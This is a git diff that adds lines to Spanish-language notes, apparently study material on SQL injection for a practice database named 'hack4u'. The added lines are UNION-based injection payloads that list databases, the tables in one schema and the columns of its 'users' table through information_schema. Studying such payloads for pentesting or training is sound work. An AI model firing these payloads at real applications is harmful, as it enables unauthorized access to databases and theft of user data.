@@ -20,6 +20,14 @@ Podemos también enumerar el nombre de la base de datos
 `' union select database()`
 
 Enumerar todas las demás bases de datos
+`' union select group_concat(schema_name) from information_schema.schemata-- -`
+
+Enumerar tablas de una base de datos
+`' union select group_concat(table_name) from information_schema.tables where table_schema='hack4u'-- -`
+
+Enumerar las columnas de esa tabla
+`' union select group_concat(column_name) from information_schema.columns where table_schema='hack4u' and table_name='users'-- -`
+
 
 
 
